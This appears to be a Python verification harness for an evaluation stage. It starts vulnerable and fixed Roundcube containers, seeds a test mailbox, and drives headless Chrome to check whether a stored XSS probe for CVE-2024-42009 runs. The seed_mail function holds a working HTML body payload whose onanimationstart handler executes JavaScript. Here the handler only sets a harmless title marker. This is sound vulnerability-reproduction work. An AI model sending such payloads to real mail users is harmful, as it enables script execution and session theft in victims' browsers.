from __future__ import annotations

import argparse
import hashlib
import json
import os
import socket
import subprocess
import time
from pathlib import Path
from uuid import uuid4

import httpx
from playwright.sync_api import sync_playwright


APP_ROOT = Path(__file__).resolve().parents[1]
PAIR_PATH = APP_ROOT / "configs" / "stage3a-cve-roundcube-2024-42009-v1.json"
COMPOSE_PATH = APP_ROOT / "cve-roundcube" / "compose.yaml"
EVENT_SCHEMA_PATH = APP_ROOT.parent / "contracts" / "verifier-ledger-event.schema.json"
CONTROL_ORIGIN = "http://127.0.0.1:18081"
RESET_HEADERS = {"X-Ruby-Reset-Token": "development-reset-only"}
CHROME_PATH = Path(r"C:\Program Files\Google\Chrome\Application\chrome.exe")
VICTIM_USERNAME = "victim@example.test"
VICTIM_PASSWORD = "roundcube-test-only"
NORMAL_SUBJECT = "RUBY normal mail control"
ATTACK_SUBJECT = "RUBY Roundcube CVE probe"


def canonical_json(value: object) -> str:
    return json.dumps(value, ensure_ascii=False, sort_keys=True, separators=(",", ":"))


def digest_bytes(value: bytes) -> str:
    return "sha256:" + hashlib.sha256(value).hexdigest()


def digest(value: object) -> str:
    return digest_bytes(canonical_json(value).encode("utf-8"))


def run(
    arguments: list[str],
    *,
    environment: dict[str, str] | None = None,
    check: bool = True,
    timeout: int = 180,
) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        arguments,
        cwd=APP_ROOT,
        env=environment,
        check=check,
        timeout=timeout,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
    )


def main_compose(*arguments: str) -> subprocess.CompletedProcess[str]:
    return run(["docker", "compose", *arguments])


def cve_compose(
    project: str,
    target_image: str,
    mail_image: str,
    relay_image: str,
    relay_port: int,
    *arguments: str,
    check: bool = True,
) -> subprocess.CompletedProcess[str]:
    environment = os.environ.copy()
    environment.update(
        {
            "RUBY_ROUNDCUBE_TARGET_IMAGE": target_image,
            "RUBY_ROUNDCUBE_MAIL_IMAGE": mail_image,
            "RUBY_ROUNDCUBE_RELAY_IMAGE": relay_image,
            "RUBY_ROUNDCUBE_RELAY_PORT": str(relay_port),
        }
    )
    return run(
        ["docker", "compose", "-p", project, "-f", str(COMPOSE_PATH), *arguments],
        environment=environment,
        check=check,
        timeout=240,
    )


def free_local_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.bind(("127.0.0.1", 0))
        return int(listener.getsockname()[1])


def require_main_stack() -> None:
    httpx.get(f"{CONTROL_ORIGIN}/health/live", timeout=5).raise_for_status()
    for service in ("api", "evaluator"):
        if not main_compose("ps", "-q", service).stdout.strip():
            raise RuntimeError(f"main Compose service is not running: {service}")
    if not CHROME_PATH.is_file():
        raise RuntimeError(f"system Chrome is unavailable: {CHROME_PATH}")


def reset_main_stack() -> None:
    httpx.post(
        f"{CONTROL_ORIGIN}/internal/reset", headers=RESET_HEADERS, timeout=20
    ).raise_for_status()


def main_service_image_digest(service: str) -> str:
    container_id = main_compose("ps", "-q", service).stdout.strip()
    return run(["docker", "inspect", container_id, "--format", "{{.Image}}"]).stdout.strip()


def main_compose_exec(service: str, code: str, *arguments: str) -> str:
    return main_compose(
        "exec", "-T", service, "python", "-c", code, *arguments
    ).stdout.strip()


def record_effect(trial_id: str, protected_key: str) -> None:
    code = (
        "import sys;"
        "from ruby_web.config import Settings;"
        "from ruby_web.database import Database;"
        "from ruby_web.events import record_internal_event;"
        "d=Database(Settings.from_environment().database_url);s=d.sessions();"
        "record_internal_event(s,trial_id=sys.argv[1],event_type='browser.code_executed',"
        "subject={'authorized':'false'},object_={'resource_id':sys.argv[2]},"
        "protected_resource_key=sys.argv[2],deduplication_key='roundcube-browser-marker');"
        "s.commit();s.close()"
    )
    main_compose_exec("api", code, trial_id, protected_key)


def evaluator_manifest(protected_key: str) -> tuple[str, dict[str, object]]:
    predicate_id = "roundcube.cve-2024-42009.browser-marker"
    subject = {"authorized": "false"}
    object_ = {"resource_id": protected_key}
    condition = {
        "deduplication_key": "roundcube-browser-marker",
        "event_type": "browser.code_executed",
        "minimum_occurrences": 1,
        "object": object_,
        "protected_resource_key": protected_key,
        "subject": subject,
        "window_seconds": 300,
    }
    manifest = {
        "contract_version": 1,
        "scenario_id": "roundcube-cve-2024-42009",
        "verifier_image_digest": main_service_image_digest("evaluator"),
        "event_schema_digest": digest_bytes(EVENT_SCHEMA_PATH.read_bytes()),
        "network_access": "control-only",
        "attacker_visible": False,
        "predicates": [
            {
                "predicate_id": predicate_id,
                "effect_type": "browser-code-execution",
                "event_type": "browser.code_executed",
                "subject_selector": canonical_json(subject),
                "object_selector": canonical_json(object_),
                "protected_resource_key": protected_key,
                "condition_digest": digest(condition),
                "window_seconds": 300,
                "minimum_occurrences": 1,
                "deduplication_key": "roundcube-browser-marker",
            }
        ],
    }
    return predicate_id, manifest


def evaluate(trial_id: str, protected_key: str) -> tuple[dict[str, object], dict[str, object]]:
    predicate_id, manifest = evaluator_manifest(protected_key)
    payload = canonical_json(
        {"trial_id": trial_id, "predicate_id": predicate_id, "verifier": manifest}
    )
    code = (
        "import os,sys,urllib.request;"
        "r=urllib.request.Request('http://127.0.0.1:8000/internal/evaluate',"
        "data=sys.argv[1].encode(),headers={'Content-Type':'application/json',"
        "'X-Ruby-Evaluator-Token':os.environ['RUBY_EVALUATOR_TOKEN']});"
        "print(urllib.request.urlopen(r).read().decode())"
    )
    return json.loads(main_compose_exec("evaluator", code, payload)), manifest


def wait_ready(origin: str, container_ids: dict[str, str]) -> int:
    started = time.monotonic()
    deadline = started + 120
    while time.monotonic() < deadline:
        for service, container_id in container_ids.items():
            status = run(
                ["docker", "inspect", container_id, "--format", "{{.State.Status}}"]
            ).stdout.strip()
            if status != "running":
                raise RuntimeError(f"Roundcube service stopped before readiness: {service}={status}")
        try:
            response = httpx.get(origin, timeout=3, follow_redirects=True)
            if response.status_code == 200 and "rcmloginuser" in response.text:
                return round((time.monotonic() - started) * 1000)
        except httpx.HTTPError:
            pass
        time.sleep(2)
    raise RuntimeError("Roundcube did not become ready within 120 seconds")


def seed_mail(client_image: str, network: str, marker: str) -> dict[str, object]:
    script = r'''import smtplib
from email.mime.text import MIMEText

def send(subject, body, subtype):
    message = MIMEText(body, subtype, "utf-8")
    message["From"] = "sender@example.test"
    message["To"] = "victim@example.test"
    message["Subject"] = subject
    with smtplib.SMTP("mail", 3025, timeout=20) as client:
        client.send_message(message)

send("RUBY normal mail control", "Normal control message", "plain")
payload = """<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=document.title='RUBY-CVE-2024-42009-SUCCESS' foo=bar"><p>Roundcube parser regression probe</p></body>"""
send("RUBY Roundcube CVE probe", payload, "html")
print("seeded 2")
'''
    result = run(
        [
            "docker",
            "run",
            "--rm",
            "--network",
            network,
            "--read-only",
            "--tmpfs",
            "/tmp:rw,noexec,nosuid,size=8m",
            "--memory",
            "128m",
            "--cpus",
            "0.5",
            "--pids-limit",
            "64",
            "--cap-drop",
            "ALL",
            "--security-opt",
            "no-new-privileges:true",
            client_image,
            "python",
            "-c",
            script,
        ],
        check=False,
        timeout=60,
    )
    return {
        "returncode": result.returncode,
        "stdout": result.stdout.strip(),
        "stderr_sha256": digest_bytes(result.stderr.encode()),
        "message_count": 2 if result.returncode == 0 else 0,
        "marker_sha256": digest_bytes(marker.encode()),
    }


def browser_probe(origin: str, marker: str) -> dict[str, object]:
    started = time.monotonic()
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(
            executable_path=str(CHROME_PATH),
            headless=True,
            args=["--disable-gpu", "--no-first-run"],
        )
        context = browser.new_context()
        page = context.new_page()
        page.goto(origin, wait_until="domcontentloaded", timeout=30_000)
        page.locator("#rcmloginuser").fill(VICTIM_USERNAME)
        page.locator("#rcmloginpwd").fill(VICTIM_PASSWORD)
        page.locator("#rcmloginsubmit").click()
        page.get_by_text(NORMAL_SUBJECT, exact=True).wait_for(timeout=30_000)
        page.get_by_text(ATTACK_SUBJECT, exact=True).wait_for(timeout=30_000)
        page.get_by_text(NORMAL_SUBJECT, exact=True).dblclick()
        page.wait_for_function(
            "subject => document.title.includes(subject)",
            arg=NORMAL_SUBJECT,
            timeout=15_000,
        )
        normal_title = page.title()
        page.goto(origin + "/?_task=mail&_mbox=INBOX", wait_until="domcontentloaded")
        page.get_by_text(ATTACK_SUBJECT, exact=True).wait_for(timeout=30_000)
        page.get_by_text(ATTACK_SUBJECT, exact=True).dblclick()
        page.wait_for_timeout(2_000)
        attack_title = page.title()
        marker_executed = attack_title == marker
        context.close()
        browser.close()
    return {
        "normal_subject_visible": NORMAL_SUBJECT in normal_title,
        "normal_title": normal_title,
        "attack_title": attack_title,
        "marker_executed": marker_executed,
        "elapsed_milliseconds": round((time.monotonic() - started) * 1000),
        "browser_product": "Google Chrome",
        "browser_executable_sha256": digest_bytes(CHROME_PATH.read_bytes()),
    }


def image_evidence(reference: str, expected_digest: str) -> dict[str, object]:
    inspected = json.loads(run(["docker", "image", "inspect", reference]).stdout)[0]
    return {
        "reference": reference,
        "image_id": inspected["Id"],
        "repo_digests": inspected.get("RepoDigests", []),
        "architecture": inspected["Architecture"],
        "os": inspected["Os"],
        "size_bytes": inspected["Size"],
        "digest_matches": inspected["Id"] == expected_digest
        or any(value.endswith("@" + expected_digest) for value in inspected.get("RepoDigests", [])),
        "linux_amd64": inspected["Os"] == "linux" and inspected["Architecture"] == "amd64",
    }


def runtime_stats(container_ids: dict[str, str]) -> dict[str, object]:
    result: dict[str, object] = {}
    for service, container_id in container_ids.items():
        result[service] = json.loads(
            run(
                ["docker", "stats", "--no-stream", "--format", "{{json .}}", container_id]
            ).stdout
        )
    return result


def remaining_resources(project: str) -> dict[str, list[str]]:
    containers = run(
        ["docker", "ps", "-a", "--filter", f"label=com.docker.compose.project={project}", "--format", "{{.ID}}"]
    ).stdout.splitlines()
    networks = run(
        ["docker", "network", "ls", "--filter", f"label=com.docker.compose.project={project}", "--format", "{{.ID}}"]
    ).stdout.splitlines()
    return {"containers": containers, "networks": networks}


def run_condition(
    *, name: str, release: dict[str, object], pair: dict[str, object]
) -> dict[str, object]:
    project = f"ruby-roundcube-{name}-{uuid4().hex[:10]}"
    relay_port = free_local_port()
    target_image = f"roundcube/roundcubemail@{release['image_digest']}"
    mail_image = f"greenmail/standalone@{pair['mail']['image_digest']}"
    relay_image = f"nginx@{pair['relay']['image_digest']}"
    client_image = f"python@{pair['mail_seed_client']['image_digest']}"
    origin = f"http://127.0.0.1:{relay_port}"
    trial_id = uuid4().hex
    marker = str(pair["browser"]["success_marker"])
    protected_key = str(pair["reference_attack"]["protected_resource_key"])
    reset_main_stack()
    started = time.monotonic()
    try:
        cve_compose(project, target_image, mail_image, relay_image, relay_port, "up", "-d", "--no-build")
        container_ids = {
            service: cve_compose(
                project, target_image, mail_image, relay_image, relay_port, "ps", "-q", service
            ).stdout.strip()
            for service in ("mail", "roundcube", "relay")
        }
        if not all(container_ids.values()):
            raise RuntimeError("Roundcube condition did not create all services")
        ready_ms = wait_ready(origin, container_ids)
        seed = seed_mail(client_image, f"{project}_target", marker)
        if seed["returncode"] != 0:
            raise RuntimeError("mail seeding failed")
        browser = browser_probe(origin, marker)
        if browser["marker_executed"]:
            record_effect(trial_id, protected_key)
        evaluator, verifier = evaluate(trial_id, protected_key)
        images = {
            "roundcube": image_evidence(target_image, str(release["image_digest"])),
            "mail": image_evidence(mail_image, str(pair["mail"]["image_digest"])),
            "relay": image_evidence(relay_image, str(pair["relay"]["image_digest"])),
        }
        expected = name == "vulnerable"
        event_count = len(evaluator["matched_event_ids"])
        checks = {
            "sealed_image_digests": all(item["digest_matches"] for item in images.values()),
            "linux_amd64_runtime": all(item["linux_amd64"] for item in images.values()),
            "mail_seeded": seed["message_count"] == 2,
            "normal_message_rendered": bool(browser["normal_subject_visible"]),
            "browser_marker_matches_condition": bool(browser["marker_executed"]) is expected,
            "evaluator_matches_condition": bool(evaluator["objective_achieved"]) is expected,
            "event_count_matches_condition": event_count == (1 if expected else 0),
        }
        logs = {
            service: digest_bytes(
                cve_compose(
                    project, target_image, mail_image, relay_image, relay_port,
                    "logs", "--no-color", service, check=False
                ).stdout.encode()
            )
            for service in container_ids
        }
        return {
            "condition": name,
            "version": release["version"],
            "trial_id": trial_id,
            "project": project,
            "ready_milliseconds": ready_ms,
            "mail_seed": seed,
            "browser": browser,
            "evaluator": evaluator,
            "verifier_digest": digest(verifier),
            "images": images,
            "runtime_stats": runtime_stats(container_ids),
            "elapsed_milliseconds": round((time.monotonic() - started) * 1000),
            "checks": checks,
            "all_checks_passed": all(checks.values()),
            "service_log_sha256": logs,
        }
    finally:
        cve_compose(
            project, target_image, mail_image, relay_image, relay_port,
            "down", "--volumes", "--remove-orphans", check=False
        )


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Check the sealed Roundcube CVE pair")
    parser.add_argument("--output-dir", type=Path, required=True)
    parser.add_argument("--run-id", required=True)
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.output_dir.exists():
        raise FileExistsError(f"refusing to overwrite output: {args.output_dir}")
    require_main_stack()
    pair = json.loads(PAIR_PATH.read_text(encoding="utf-8"))
    args.output_dir.mkdir(parents=True, exist_ok=False)
    conditions: list[dict[str, object]] = []
    try:
        for name in ("vulnerable", "fixed"):
            conditions.append(run_condition(name=name, release=pair[name], pair=pair))
    except Exception as error:
        failure_path = args.output_dir / "stage3a-roundcube-cve-pair-failure.json"
        failure_path.write_text(
            json.dumps(
                {
                    "schema_version": 1,
                    "run_id": args.run_id,
                    "pair_digest": digest_bytes(PAIR_PATH.read_bytes()),
                    "completed_conditions": conditions,
                    "failure_type": type(error).__name__,
                    "failure_reason": str(error),
                },
                ensure_ascii=False,
                indent=2,
                sort_keys=True,
            ) + "\n",
            encoding="utf-8",
        )
        print(canonical_json({
            "failure_report": str(failure_path),
            "failure_report_sha256": digest_bytes(failure_path.read_bytes()),
            "status": "failed",
        }))
        return 2
    residue = {
        condition["project"]: remaining_resources(str(condition["project"]))
        for condition in conditions
    }
    report = {
        "schema_version": 1,
        "run_id": args.run_id,
        "pair_digest": digest_bytes(PAIR_PATH.read_bytes()),
        "pair": pair,
        "conditions": conditions,
        "cleanup": residue,
        "all_checks_passed": all(condition["all_checks_passed"] for condition in conditions)
        and all(not resources["containers"] and not resources["networks"] for resources in residue.values()),
    }
    report_path = args.output_dir / "stage3a-roundcube-cve-pair-report.json"
    report_path.write_text(
        json.dumps(report, ensure_ascii=False, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )
    print(canonical_json({
        "report": str(report_path),
        "report_sha256": digest_bytes(report_path.read_bytes()),
        "all_checks_passed": report["all_checks_passed"],
    }))
    return 0 if report["all_checks_passed"] else 2


if __name__ == "__main__":
    raise SystemExit(main())
